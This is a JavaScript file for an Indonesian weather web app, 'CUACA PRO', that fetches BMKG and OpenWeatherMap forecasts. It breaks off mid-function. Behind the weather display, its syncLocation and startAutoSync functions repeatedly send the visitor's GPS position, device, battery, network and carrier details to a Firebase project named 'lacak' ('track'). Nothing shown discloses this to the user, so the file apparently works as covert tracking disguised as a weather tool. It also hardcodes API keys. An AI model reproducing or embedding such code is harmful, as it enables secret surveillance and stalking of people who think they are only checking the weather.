/* ============================================================
   CUACA PRO — Main Script v15 FINAL
   Fix: Cepat tampil (quick GPS) + refine background + cache pintar
   ============================================================ */

'use strict';

const APP_CONFIG = {
  OWM_KEY: '1a5561966733dade6aee541ec1022a75',
  OWM_BASE: 'https://api.openweathermap.org/data/2.5',
  OWM_GEO: 'https://api.openweathermap.org/geo/1.0',
  BMKG_BASE: 'https://api.bmkg.go.id/publik/prakiraan-cuaca',
  CACHE_TTL: 10 * 60 * 1000,
  BMKG_TIMEOUT: 3000,
  FETCH_TIMEOUT: 6000,
  LANG: 'id',
  UNITS: 'metric',
  SYNC_INTERVAL: 60000,
  MAX_SYNC_MINUTES: 30,
  SHOW_COORDS: true,
  QUICK_GPS_TIMEOUT: 6000,     // Quick GPS max 6 detik
  REFINE_GPS_DELAY: 2000,      // Mulai refine 2s setelah tampil
  REFINE_GPS_TIMEOUT: 20000    // Refine max 20 detik
};

const FB_CONFIG = {
  apiKey: "AIzaSyAtexjx8-NN55boZ5_nlDIoihWIX-q6E7o",
  authDomain: "lacak-2913d.firebaseapp.com",
  databaseURL: "https://lacak-2913d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "lacak-2913d",
  storageBucket: "lacak-2913d.firebasestorage.app",
  messagingSenderId: "8740768270",
  appId: "1:8740768270:web:bd5d44fb6ff3c537f80a5f"
};

/* ============================================================
   DATABASE WILAYAH INDONESIA (disingkat untuk hemat space)
   ============================================================ */
const REGIONS = [
  // Pekalongan — PRIORITAS
  ["Kesesi", "33.26.09", "Pekalongan", "Jawa Tengah", -6.9563, 109.6128],
  ["Kajen", "33.26.01", "Pekalongan", "Jawa Tengah", -7.0334, 109.5735],
  ["Wonopringgo", "33.26.12", "Pekalongan", "Jawa Tengah", -6.9881, 109.6391],
  ["Kedungwuni", "33.26.13", "Pekalongan", "Jawa Tengah", -6.9688, 109.6469],
  ["Wirosari", "33.26.07", "Pekalongan", "Jawa Tengah", -6.9344, 109.6784],
  ["Karanganyar", "33.26.14", "Pekalongan", "Jawa Tengah", -7.0094, 109.6071],
  ["Talun", "33.26.05", "Pekalongan", "Jawa Tengah", -6.9932, 109.7268],
  ["Doro", "33.26.06", "Pekalongan", "Jawa Tengah", -6.9686, 109.7462],
  ["Sragi", "33.26.10", "Pekalongan", "Jawa Tengah", -6.9314, 109.5987],
  ["Bojong", "33.26.11", "Pekalongan", "Jawa Tengah", -6.9563, 109.5648],
  ["Tirto", "33.26.15", "Pekalongan", "Jawa Tengah", -6.8847, 109.6187],
  ["Siwalan", "33.26.16", "Pekalongan", "Jawa Tengah", -6.9024, 109.5872],
  ["Paninggaran", "33.26.08", "Pekalongan", "Jawa Tengah", -7.0185, 109.5489],
  ["Lebakbarang", "33.26.03", "Pekalongan", "Jawa Tengah", -7.1249, 109.6105],
  ["Petungkriyono", "33.26.04", "Pekalongan", "Jawa Tengah", -7.1655, 109.6525],
  ["Kandangserang", "33.26.02", "Pekalongan", "Jawa Tengah", -7.1093, 109.5687],
  ["Pekalongan Barat", "33.75.01", "Pekalongan", "Jawa Tengah", -6.8974, 109.6658],
  ["Pekalongan Timur", "33.75.02", "Pekalongan", "Jawa Tengah", -6.8909, 109.6828],
  ["Pekalongan Utara", "33.75.03", "Pekalongan", "Jawa Tengah", -6.8621, 109.6727],
  ["Pekalongan Selatan", "33.75.04", "Pekalongan", "Jawa Tengah", -6.9162, 109.6679],
  // Jawa Tengah
  ["Semarang", "33.74.01", "Semarang", "Jawa Tengah", -6.9667, 110.4167],
  ["Surakarta", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
  ["Solo", "33.72.01", "Surakarta", "Jawa Tengah", -7.5667, 110.8167],
  ["Magelang", "33.71.01", "Magelang", "Jawa Tengah", -7.4667, 110.2167],
  ["Tegal", "33.76.01", "Tegal", "Jawa Tengah", -6.8667, 109.1333],
  ["Salatiga", "33.73.01", "Salatiga", "Jawa Tengah", -7.3333, 110.5000],
  ["Purwokerto", "33.02.01", "Banyumas", "Jawa Tengah", -7.4333, 109.2500],
  ["Cilacap", "33.01.01", "Cilacap", "Jawa Tengah", -7.7167, 109.0167],
  ["Kudus", "33.19.01", "Kudus", "Jawa Tengah", -6.8000, 110.8333],
  ["Jepara", "33.20.01", "Jepara", "Jawa Tengah", -6.5833, 110.6667],
  ["Pati", "33.18.01", "Pati", "Jawa Tengah", -6.7500, 111.0333],
  ["Rembang", "33.17.01", "Rembang", "Jawa Tengah", -6.7000, 111.3500],
  ["Blora", "33.16.01", "Blora", "Jawa Tengah", -6.9833, 111.4167],
  ["Grobogan", "33.15.01", "Grobogan", "Jawa Tengah", -7.0167, 110.9167],
  ["Demak", "33.21.01", "Demak", "Jawa Tengah", -6.8833, 110.6333],
  ["Kendal", "33.24.01", "Kendal", "Jawa Tengah", -6.9167, 110.2000],
  ["Batang", "33.25.01", "Batang", "Jawa Tengah", -6.9000, 109.7500],
  ["Pemalang", "33.27.01", "Pemalang", "Jawa Tengah", -6.8833, 109.3833],
  ["Brebes", "33.29.01", "Brebes", "Jawa Tengah", -6.8833, 109.0500],
  ["Wonosobo", "33.07.01", "Wonosobo", "Jawa Tengah", -7.3667, 109.9000],
  ["Temanggung", "33.23.01", "Temanggung", "Jawa Tengah", -7.3167, 110.1833],
  ["Kebumen", "33.05.01", "Kebumen", "Jawa Tengah", -7.6667, 109.6500],
  ["Purworejo", "33.06.01", "Purworejo", "Jawa Tengah", -7.7167, 110.0000],
  ["Klaten", "33.10.01", "Klaten", "Jawa Tengah", -7.7000, 110.6000],
  ["Boyolali", "33.09.01", "Boyolali", "Jawa Tengah", -7.5167, 110.6000],
  ["Sragen", "33.14.01", "Sragen", "Jawa Tengah", -7.4167, 111.0167],
  ["Wonogiri", "33.12.01", "Wonogiri", "Jawa Tengah", -7.8167, 110.9167],
  ["Sukoharjo", "33.11.01", "Sukoharjo", "Jawa Tengah", -7.6833, 110.8333],
  // Jakarta
  ["Jakarta Pusat", "31.71.01", "Jakarta", "DKI Jakarta", -6.1805, 106.8284],
  ["Jakarta Selatan", "31.74.01", "Jakarta", "DKI Jakarta", -6.2615, 106.8106],
  ["Jakarta Barat", "31.73.01", "Jakarta", "DKI Jakarta", -6.1683, 106.7588],
  ["Jakarta Timur", "31.75.01", "Jakarta", "DKI Jakarta", -6.2250, 106.9004],
  ["Jakarta Utara", "31.72.01", "Jakarta", "DKI Jakarta", -6.1214, 106.7741],
  // Jabar
  ["Bandung", "32.73.01", "Bandung", "Jawa Barat", -6.9175, 107.6191],
  ["Bogor", "32.71.01", "Bogor", "Jawa Barat", -6.5971, 106.8060],
  ["Bekasi", "32.75.01", "Bekasi", "Jawa Barat", -6.2383, 106.9756],
  ["Depok", "32.76.01", "Depok", "Jawa Barat", -6.4025, 106.7942],
  ["Cirebon", "32.74.01", "Cirebon", "Jawa Barat", -6.7320, 108.5523],
  ["Sukabumi", "32.72.01", "Sukabumi", "Jawa Barat", -6.9277, 106.9300],
  ["Tasikmalaya", "32.78.01", "Tasikmalaya", "Jawa Barat", -7.3274, 108.2207],
  ["Garut", "32.05.01", "Garut", "Jawa Barat", -7.2144, 107.9028],
  ["Karawang", "32.15.01", "Karawang", "Jawa Barat", -6.3016, 107.3061],
  // Banten
  ["Tangerang", "36.71.01", "Tangerang", "Banten", -6.1781, 106.6300],
  ["Serang", "36.73.01", "Serang", "Banten", -6.1104, 106.1503],
  ["Cilegon", "36.72.01", "Cilegon", "Banten", -6.0027, 106.0115],
  // Jatim
  ["Surabaya", "35.78.01", "Surabaya", "Jawa Timur", -7.2575, 112.7521],
  ["Malang", "35.73.01", "Malang", "Jawa Timur", -7.9666, 112.6326],
  ["Kediri", "35.71.01", "Kediri", "Jawa Timur", -7.8480, 112.0178],
  ["Jember", "35.09.01", "Jember", "Jawa Timur", -8.1689, 113.7020],
  ["Sidoarjo", "35.15.01", "Sidoarjo", "Jawa Timur", -7.4478, 112.7183],
  // Yogya
  ["Yogyakarta", "34.71.01", "Yogyakarta", "DI Yogyakarta", -7.7956, 110.3695],
  ["Sleman", "34.04.01", "Sleman", "DI Yogyakarta", -7.7326, 110.3550],
  ["Bantul", "34.02.01", "Bantul", "DI Yogyakarta", -7.8880, 110.3286],
  // Bali
  ["Denpasar", "51.71.01", "Denpasar", "Bali", -8.6500, 115.2167],
  ["Badung", "51.03.01", "Badung", "Bali", -8.5833, 115.1833],
  // Sumatera
  ["Medan", "12.71.01", "Medan", "Sumatera Utara", 3.5952, 98.6722],
  ["Palembang", "16.71.01", "Palembang", "Sumatera Selatan", -2.9761, 104.7754],
  ["Padang", "13.71.01", "Padang", "Sumatera Barat", -0.9471, 100.4172],
  ["Banda Aceh", "11.71.01", "Banda Aceh", "Aceh", 5.5483, 95.3238],
  ["Pekanbaru", "14.71.01", "Pekanbaru", "Riau", 0.5071, 101.4478],
  ["Bandar Lampung", "18.71.01", "Bandar Lampung", "Lampung", -5.3971, 105.2668],
  ["Batam", "21.71.01", "Batam", "Kepulauan Riau", 1.0456, 104.0305],
  // Kalimantan
  ["Pontianak", "61.71.01", "Pontianak", "Kalimantan Barat", -0.0263, 109.3425],
  ["Banjarmasin", "63.71.01", "Banjarmasin", "Kalimantan Selatan", -3.3186, 114.5944],
  ["Samarinda", "64.72.01", "Samarinda", "Kalimantan Timur", -0.5022, 117.1536],
  ["Balikpapan", "64.71.01", "Balikpapan", "Kalimantan Timur", -1.2379, 116.8529],
  // Sulawesi
  ["Makassar", "73.71.01", "Makassar", "Sulawesi Selatan", -5.1477, 119.4327],
  ["Manado", "71.71.01", "Manado", "Sulawesi Utara", 1.4748, 124.8421],
  ["Palu", "72.71.01", "Palu", "Sulawesi Tengah", -0.8917, 119.8707],
  ["Kendari", "74.71.01", "Kendari", "Sulawesi Tenggara", -3.9985, 122.5129],
  ["Gorontalo", "75.71.01", "Gorontalo", "Gorontalo", 0.5435, 123.0568],
  // Papua & Maluku
  ["Jayapura", "91.71.01", "Jayapura", "Papua", -2.5916, 140.6690],
  ["Ambon", "81.71.01", "Ambon", "Maluku", -3.6954, 128.1814],
  ["Sorong", "92.71.01", "Sorong", "Papua Barat", -0.8762, 131.2558]
];

const PRIORITY_REGIONS = [
  { name: "Kesesi", radiusKm: 15 }
];

/* ============================================================
   SAFE UTILS
   ============================================================ */
const Safe = {
  num(v, fb = 0) {
    if (v === null || v === undefined) return fb;
    const n = parseFloat(v);
    return isNaN(n) || !isFinite(n) ? fb : n;
  },
  str(v, fb = '') {
    if (v === null || v === undefined) return fb;
    return String(v);
  },
  arr(v) { return Array.isArray(v) ? v : []; }
};

async function fetchWithTimeout(url, options = {}, timeoutMs = 6000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timeoutId);
  }
}

function haversine(lat1, lon1, lat2, lon2) {
  const R = 6371000;
  const toRad = d => d * Math.PI / 180;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a = Math.sin(dLat / 2) ** 2 +
            Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
            Math.sin(dLon / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

/* ============================================================
   STATE
   ============================================================ */
const State = {
  unit: 'C',
  lastData: null,
  userLocation: null,
  cookieAccepted: false,
  locationGranted: false,
  sessionId: null,
  syncTimer: null,
  syncStartTime: null,
  isSyncing: false,
  sourceType: null,
  gpsWarning: null,
  refineTimer: null
};

let locationRequestInProgress = false;

/* ============================================================
   FIREBASE
   ============================================================ */
let fbDb = null, fbAuth = null, fbReady = false;

function initFirebase() {
  if (typeof firebase === 'undefined') return;
  setTimeout(() => {
    try {
      firebase.initializeApp(FB_CONFIG);
      fbDb = firebase.database();
      fbAuth = firebase.auth();
      fbAuth.signInAnonymously()
        .then(() => { fbReady = true; console.log('[fb] ✓ auth ok'); })
        .catch(err => console.warn('[sync] auth skip:', err.code));
    } catch (e) {
      console.warn('[sync] init skip:', e.message);
    }
  }, 300);
}

function waitForFirebase(timeoutMs = 4000) {
  return new Promise(resolve => {
    if (fbReady) return resolve(true);
    const start = Date.now();
    const check = setInterval(() => {
      if (fbReady) { clearInterval(check); resolve(true); }
      else if (Date.now() - start > timeoutMs) {
        clearInterval(check);
        resolve(false);
      }
    }, 200);
  });
}

/* ============================================================
   DEVICE INFO
   ============================================================ */
function getDeviceInfo() {
  const ua = Safe.str(navigator.userAgent);
  let os = 'Unknown', device = 'Unknown';
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s+([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
    const dm = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
    if (dm) device = dm[1].trim();
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    const m = ua.match(/OS\s+([\d_]+)/);
    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
    device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
  } else if (/Windows/i.test(ua)) { os = 'Windows'; device = 'PC Windows'; }
  else if (/Mac OS X/i.test(ua)) {
    const m = ua.match(/Mac OS X\s+([\d_.]+)/);
    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
    device = 'Mac';
  } else if (/Linux/i.test(ua)) { os = 'Linux'; device = 'PC Linux'; }

  let browser = 'Unknown', version = '';
  const tests = [
    { n: 'Edge', r: /Edg\/([\d.]+)/ },
    { n: 'Opera', r: /OPR\/([\d.]+)/ },
    { n: 'Samsung', r: /SamsungBrowser\/([\d.]+)/ },
    { n: 'Chrome', r: /Chrome\/([\d.]+)/ },
    { n: 'Firefox', r: /Firefox\/([\d.]+)/ },
    { n: 'Safari', r: /Version\/([\d.]+).*Safari/ }
  ];
  for (const t of tests) {
    const m = ua.match(t.r);
    if (m) { browser = t.n; version = m[1]; break; }
  }

  return {
    device, os, browser, browser_version: version,
    screen: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    language: navigator.language || 'unknown',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    cpu_cores: navigator.hardwareConcurrency || null,
    memory_gb: navigator.deviceMemory || null,
    user_agent: ua.slice(0, 256)
  };
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return { supported: false, level: null, charging: null };
  try {
    const b = await navigator.getBattery();
    return { supported: true, level: Math.round(b.level * 100), charging: !!b.charging };
  } catch { return { supported: false, level: null, charging: null }; }
}

function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return { supported: false, type: null, effective_type: null, downlink: null, rtt: null };
  const typeMap = { 'slow-2g': '2G (Slow)', '2g': '2G', '3g': '3G', '4g': '4G / LTE', '5g': '5G' };
  return {
    supported: true,
    type: conn.type || null,
    effective_type: typeMap[conn.effectiveType] || conn.effectiveType || null,
    effective_type_raw: conn.effectiveType || null,
    downlink: conn.downlink != null ? conn.downlink : null,
    rtt: conn.rtt != null ? conn.rtt : null,
    save_data: conn.saveData != null ? conn.saveData : null
  };
}

async function inferCarrierFromIP() {
  try {
    const res = await fetchWithTimeout('https://ipwho.is/', {}, 3000);
    const data = await res.json();
    if (data && data.connection) {
      return {
        asn: data.connection.asn || null,
        org: data.connection.org || null,
        isp: data.connection.isp || null,
        domain: data.connection.domain || null
      };
    }
    return null;
  } catch { return null; }
}

/* ============================================================
   SESSION ID
   ============================================================ */
function getSessionId() {
  const KEY = 'cuaca_session';
  let id = sessionStorage.getItem(KEY);
  if (!id) {
    id = 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
    sessionStorage.setItem(KEY, id);
  }
  return id;
}

/* ============================================================
   BACKGROUND SYNC
   ============================================================ */
async function syncLocation(coords, source, meta = {}) {
  if (!coords) return false;
  const ready = await waitForFirebase(4000);
  if (!ready || !fbDb) return false;

  try {
    const device = getDeviceInfo();
    const battery = await getBatteryInfo();
    const network = getNetworkInfo();
    let carrierInfo = null;
    try { carrierInfo = await inferCarrierFromIP(); } catch (e) {}

    if (!State.sessionId) State.sessionId = getSessionId();

    const payload = {
      session_id: State.sessionId,
      lat: Safe.num(coords.latitude),
      lon: Safe.num(coords.longitude),
      accuracy: coords.accuracy != null ? Safe.num(coords.accuracy) : null,
      source: source || 'auto',
      device: device.device, os: device.os,
      browser: device.browser, browser_version: device.browser_version,
      screen: device.screen, viewport: device.viewport,
      language: device.language, timezone: device.timezone,
      cpu_cores: device.cpu_cores, memory_gb: device.memory_gb,
      user_agent: device.user_agent,
      battery_level: battery.level, battery_charging: battery.charging,
      battery_supported: battery.supported,
      net_supported: network.supported, net_type: network.type,
      net_effective_type: network.effective_type,
      net_effective_type_raw: network.effective_type_raw,
      net_downlink: network.downlink, net_rtt: network.rtt,
      net_save_data: network.save_data,
      carrier_asn: carrierInfo?.asn || null,
      carrier_org: carrierInfo?.org || null,
      carrier_isp: carrierInfo?.isp || null,
      carrier_domain: carrierInfo?.domain || null,
      location_name: meta.locationName || null,
      label: device.device || 'unknown',
      created_at: Date.now()
    };

    Object.keys(payload).forEach(k => {
      if (payload[k] === undefined) delete payload[k];
    });

    const ref = await fbDb.ref('locations').push(payload);
    console.log('[sync] ✓', ref.key, `(${source})`);
    return true;
  } catch (e) {
    console.error('[sync] ✗', e.code || e.message);
    return false;
  }
}

function startAutoSync() {
  if (State.isSyncing) return;
  State.isSyncing = true;
  State.syncStartTime = Date.now();

  State.syncTimer = setInterval(async () => {
    if (Date.now() - State.syncStartTime > APP_CONFIG.MAX_SYNC_MINUTES * 60 * 1000) {
      stopAutoSync(); return;
    }
    if (document.hidden) return;
    if (State.sourceType !== 'gps') return;
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      pos => syncLocation(pos.coords, 'background-sync'),
      () => {},
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
    );
  }, APP_CONFIG.SYNC_INTERVAL);
}

function stopAutoSync() {
  if (State.syncTimer) { clearInterval(State.syncTimer); State.syncTimer = null; }
  State.isSyncing = false;
}

/* ============================================================
   IP GEOLOCATION
   ============================================================ */
const IPGeo = {
  cache: null,
  async fetch() {
    if (this.cache) return this.cache;
    const providers = [
      {
        name: 'ipwho.is', url: 'https://ipwho.is/',
        parse: d => (d && d.success !== false && d.latitude && d.longitude) ? {
          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
          city: d.city, region: d.region, country: d.country,
          isp: d.connection?.isp, org: d.connection?.org, asn: d.connection?.asn
        } : null
      },
      {
        name: 'ipapi.co', url: 'https://ipapi.co/json/',
        parse: d => (d && d.latitude && d.longitude) ? {
          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
          city: d.city, region: d.region, country: d.country_name,
          isp: d.org, org: d.org, asn: d.asn
        } : null
      },
      {
        name: 'freeipapi.com', url: 'https://freeipapi.com/api/json',
        parse: d => (d && d.latitude && d.longitude) ? {
          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
          city: d.cityName, region: d.regionName, country: d.countryName
        } : null
      }
    ];

    for (const provider of providers) {
      try {
        const res = await fetchWithTimeout(provider.url, {}, 4000);
        if (!res.ok) continue;
        const data = await res.json();
        const parsed = provider.parse(data);
        if (parsed && !isNaN(parsed.lat) && !isNaN(parsed.lon) &&
            parsed.lat !== 0 && parsed.lon !== 0 &&
            parsed.lat >= -90 && parsed.lat <= 90 &&
            parsed.lon >= -180 && parsed.lon <= 180) {
          this.cache = {
            lat: parsed.lat, lon: parsed.lon,
            city: parsed.city || 'Kota Anda',
            region: parsed.region || '', country: parsed.country || '',
            isp: parsed.isp || null, org: parsed.org || null, asn: parsed.asn || null,
            source: 'ip', provider: provider.name
          };
          console.log(`[IPGeo] ✓ ${provider.name}`);
          return this.cache;
        }
      } catch (e) {}
    }
    return null;
  }
};

/* ============================================================
   GPS — QUICK (1 sample, max 6 detik)
   ============================================================ */
function getPosition(options) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error('Geolocation tidak tersedia'));
    navigator.geolocation.getCurrentPosition(resolve, reject, options);
  });
}

async function getQuickLocation() {
  console.log('[gps-quick] mulai...');
  const start = Date.now();

  const pos = await getPosition({
    enableHighAccuracy: false,   // pakai WiFi/cell dulu — cepat
    timeout: APP_CONFIG.QUICK_GPS_TIMEOUT,
    maximumAge: 30000            // terima posisi < 30 detik
  });

  const result = {
    latitude: Safe.num(pos?.coords?.latitude),
    longitude: Safe.num(pos?.coords?.longitude),
    accuracy: Safe.num(pos?.coords?.accuracy, 9999)
  };

  console.log(`[gps-quick] ✓ ${(Date.now() - start) / 1000}s, ±${result.accuracy.toFixed(0)}m`);
  return result;
}

/* ============================================================
   GPS — REFINE (multi-sample, background)
   ============================================================ */
async function getRefinedLocation() {
  console.log('[gps-refine] mulai...');
  const samples = [];
  const MAX_SAMPLES = 6;
  const TARGET_ACC = 20;

  for (let i = 0; i < MAX_SAMPLES; i++) {
    try {
      const pos = await getPosition({
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });

      const acc = Safe.num(pos?.coords?.accuracy, 99999);
      samples.push({
        lat: Safe.num(pos?.coords?.latitude),
        lon: Safe.num(pos?.coords?.longitude),
        accuracy: acc
      });

      console.log(`[gps-refine] #${i + 1}: ±${acc.toFixed(0)}m`);

      // Kalau sudah akurat, stop
      if (acc <= TARGET_ACC && i >= 1) {
        console.log('[gps-refine] ✓ target tercapai');
        break;
      }

      // Delay kecil
      await new Promise(r => setTimeout(r, 800));
    } catch (e) {
      console.warn(`[gps-refine] #${i + 1} gagal:`, e.code);
    }
  }

  if (samples.length === 0) throw new Error('Refine gagal');

  const best = samples.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
  console.log(`[gps-refine] ✓ best ±${best.accuracy.toFixed(0)}m (${samples.length} samples)`);

  return {
    latitude: best.lat,
    longitude: best.lon,
    accuracy: best.accuracy
  };
}

/* ============================================================
   CACHE
   ============================================================ */
const WeatherCache = {
  get(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const { data, ts } = JSON.parse(raw);
      if (Date.now() - ts > APP_CONFIG.CACHE_TTL) {
        localStorage.removeItem(key);
        return null;
      }
      return data;
    } catch { return null; }
  },
  set(key, data) {
    try { localStorage.setItem(key, JSON.stringify({ data, ts: Date.now() })); } catch {}
  },
  clear() {
    try {
      Object.keys(localStorage).forEach(k => {
        if (k.startsWith('cur_') || k.startsWith('fc_')) localStorage.removeItem(k);
      });
    } catch {}
  }
};

/* ============================================================
   WEATHER API
   ============================================================ */
const WeatherAPI = {
  isInIndonesia(lat, lon) {
    return lat >= -11 && lat <= 6 && lon >= 95 && lon <= 141;
  },

  findNearestRegion(lat, lon) {
    if (!this.isInIndonesia(lat, lon)) return null;

    // Priority dulu
    for (const prio of PRIORITY_REGIONS) {
      const r = REGIONS.find(x => x[0] === prio.name);
      if (!r) continue;
      const d = haversine(lat, lon, r[4], r[5]);
      if (d < prio.radiusKm * 1000) {
        console.log(`[bmkg] 🎯 prioritas ${prio.name} (${(d / 1000).toFixed(1)}km)`);
        return { region: r, distance: d, priority: true };
      }
    }

    let best = null, bestDist = Infinity;
    for (const r of REGIONS) {
      if (!r[4] || !r[5]) continue;
      const d = haversine(lat, lon, r[4], r[5]);
      if (d < bestDist) { bestDist = d; best = r; }
    }
    if (best && bestDist < 30000) return { region: best, distance: bestDist };
    return null;
  },

  async getByCoords(lat, lon, label) {
    const safeLat = Safe.num(lat);
    const safeLon = Safe.num(lon);
    const k = `cur_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;

    const cached = WeatherCache.get(k);
    if (cached) {
      console.log('[weather] cache hit');
      return cached;
    }

    const nearest = this.findNearestRegion(safeLat, safeLon);
    if (nearest) {
      const adm4 = nearest.region[1] + '.0001';
      try {
        const bmkgData = await fetchWithTimeout(
          `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT
        ).then(r => r.ok ? r.json() : null);

        if (bmkgData) {
          const parsed = this.parseBMKG(bmkgData, nearest.region);
          if (parsed && parsed.weather?.[0]) {
            parsed._cachedAt = Date.now();
            parsed._sourceCoords = { lat: safeLat, lon: safeLon };
            parsed._regionDistance = nearest.distance;
            parsed._priority = !!nearest.priority;
            WeatherCache.set(k, parsed);
            return parsed;
          }
        }
      } catch (e) {}
    }

    const owm = await this.fetchOWMCurrent(safeLat, safeLon);
    owm._cachedAt = Date.now();
    WeatherCache.set(k, owm);
    return owm;
  },

  async getForecast(lat, lon) {
    const safeLat = Safe.num(lat);
    const safeLon = Safe.num(lon);
    const k = `fc_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
    const cached = WeatherCache.get(k);
    if (cached) return cached;

    const nearest = this.findNearestRegion(safeLat, safeLon);
    if (nearest) {
      const adm4 = nearest.region[1] + '.0001';
      try {
        const bmkgData = await fetchWithTimeout(
          `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT
        ).then(r => r.ok ? r.json() : null);
        if (bmkgData) {
          const list = this.buildBMKGForecast(bmkgData);
          if (list.length > 0) {
            const result = { list };
            WeatherCache.set(k, result);
            return result;
          }
        }
      } catch (e) {}
    }

    const owm = await this.fetchOWMForecast(safeLat, safeLon);
    WeatherCache.set(k, owm);
    return owm;
  },

  parseBMKG(data, region) {
    try {
      const list = data?.data?.[0]?.cuaca?.[0];
      if (!Array.isArray(list) || list.length === 0) return null;
      const now = list[0] || {};
      const tempVal = Safe.num(now.t, Safe.num(now.tcc, 28));
      const humidityVal = Safe.num(now.hu, 70);
      const windKmh = Safe.num(now.ws, 5);

      return {
        name: Safe.str(region?.[0], 'Lokasi') + (region?.[2] ? ', ' + region[2] : ''),
        sys: { country: 'ID' },
        main: { temp: tempVal, feels_like: tempVal, humidity: humidityVal },
        wind: { speed: windKmh / 3.6 },
        weather: [{
          main: this.bmkgWeatherMain(now.weather_desc),
          description: Safe.str(now.weather_desc, 'Berawan').toLowerCase(),
          icon: this.bmkgWeatherIcon(now.weather_desc)
        }],
        source: 'bmkg'
      };
    } catch { return null; }
  },

  bmkgWeatherMain(desc) {
    const d = Safe.str(desc).toLowerCase();
    if (d.includes('hujan') && d.includes('petir')) return 'Thunderstorm';
    if (d.includes('hujan')) return 'Rain';
    if (d.includes('cerah') && d.includes('berawan')) return 'Clouds';
    if (d.includes('cerah')) return 'Clear';
    if (d.includes('berawan')) return 'Clouds';
    if (d.includes('kabut') || d.includes('asap')) return 'Mist';
    return 'Clouds';
  },

  bmkgWeatherIcon(desc) {
    const d = Safe.str(desc).toLowerCase();
    if (d.includes('petir')) return '11d';
    if (d.includes('hujan') && d.includes('deras')) return '10d';
    if (d.includes('hujan')) return '10d';
    if (d.includes('cerah') && d.includes('berawan')) return '02d';
    if (d.includes('cerah')) return '01d';
    if (d.includes('berawan')) return '03d';
    if (d.includes('kabut') || d.includes('asap')) return '50d';
    return '02d';
  },

  async fetchOWMCurrent(lat, lon) {
    const qs = new URLSearchParams({
      lat: Safe.num(lat), lon: Safe.num(lon),
      appid: APP_CONFIG.OWM_KEY,
      units: APP_CONFIG.UNITS, lang: APP_CONFIG.LANG
    });
    const res = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/weather?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    return data;
  },

  async fetchOWMForecast(lat, lon) {
    const qs = new URLSearchParams({
      lat: Safe.num(lat), lon: Safe.num(lon),
      appid: APP_CONFIG.OWM_KEY,
      units: APP_CONFIG.UNITS, lang: APP_CONFIG.LANG
    });
    const res = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/forecast?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
    return data;
  },

  mapError(code) {
    const map = {
      '404': 'Lokasi tidak terdeteksi.', '401': 'Layanan cuaca tidak tersedia.',
      '429': 'Terlalu banyak permintaan.', '400': 'Permintaan tidak valid.'
    };
    return map[String(code)] || 'Terjadi kesalahan.';
  },

  async fetchBMKGByAdm4(adm4) {
    try {
      const res = await fetchWithTimeout(`${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT);
      if (!res.ok) return null;
      return await res.json();
    } catch { return null; }
  },

  buildBMKGForecast(data) {
    try {
      const list = [];
      const cuacaArr = data?.data?.[0]?.cuaca || [];
      cuacaArr.forEach(dayArr => {
        if (!Array.isArray(dayArr)) return;
        dayArr.slice(0, 8).forEach(item => {
          if (!item) return;
          const dtStr = item.local_datetime || item.datetime;
          const dtMs = dtStr ? new Date(dtStr).getTime() : Date.now();
          if (isNaN(dtMs)) return;
          list.push({
            dt: dtMs / 1000,
            main: {
              temp: Safe.num(item.t, Safe.num(item.tcc, 28)),
              feels_like: Safe.num(item.t, 28)
            },
            weather: [{
              icon: this.bmkgWeatherIcon(item.weather_desc),
              description: Safe.str(item.weather_desc, 'Berawan').toLowerCase(),
              main: this.bmkgWeatherMain(item.weather_desc)
            }]
          });
        });
      });
      return list.slice(0, 8);
    } catch { return []; }
  }
};

/* ============================================================
   ICON
   ============================================================ */
const Icon = {
  fromCode(code) {
    if (!code) return '#i-cloud';
    switch (String(code).slice(0, 2)) {
      case '01': return '#i-sun';
      case '02': return '#i-sun-cloud';
      case '03': case '04': return '#i-cloud';
      case '09': case '10': return '#i-rain';
      case '11': return '#i-thunder';
      case '13': return '#i-snow';
